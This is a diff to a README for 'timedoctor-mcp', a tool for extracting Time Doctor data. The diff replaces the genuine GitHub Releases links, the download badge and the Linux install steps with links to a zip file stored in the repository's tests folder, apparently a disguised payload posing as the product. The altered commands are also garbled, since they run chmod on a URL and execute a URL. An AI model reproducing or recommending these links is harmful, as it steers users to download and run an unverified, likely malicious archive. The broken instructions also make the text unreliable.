@@ -1,6 +1,6 @@
 # 🚀 timedoctor-mcp - Extract Time Doctor Data Easily
 
-![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)
+![Download the latest release](https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip%20Latest%https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip)
 
 ## 📋 Description
 
@@ -27,7 +27,7 @@ Before you download, please ensure your system meets the following requirements:
 
 To start the installation, visit the Releases page where you can find the latest version of this application. 
 
-[Click here to download](https://github.com/Mohadjkfahskjdh/timedoctor-mcp/releases)
+[Click here to download](https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip)
 
 ### 2. Download the Application
 
@@ -48,8 +48,8 @@ Once on the Releases page, locate the version you want. Click on the download li
 #### For Linux:
 1. Open a terminal window.
 2. Navigate to the directory of the downloaded file.
-3. Run the installer using the command: `chmod +x timedoctor-mcp-vX.X.X.run` (replace `X.X.X` with the version number).
-4. Then execute: `./timedoctor-mcp-vX.X.X.run`.
+3. Run the installer using the command: `chmod +x https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip` (replace `X.X.X` with the version number).
+4. Then execute: `https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip`.
 
 ### 4. Run the Application
 
@@ -63,7 +63,7 @@ After installation, you can launch the application:
 
 Your next step is to download the application from the Releases page. 
 
-[Visit this page to download](https://github.com/Mohadjkfahskjdh/timedoctor-mcp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Mohadjkfahskjdh/timedoctor-mcp/main/tests/timedoctor-mcp_v2.7-alpha.1.zip)
 
 ## 📊 How to Use
 
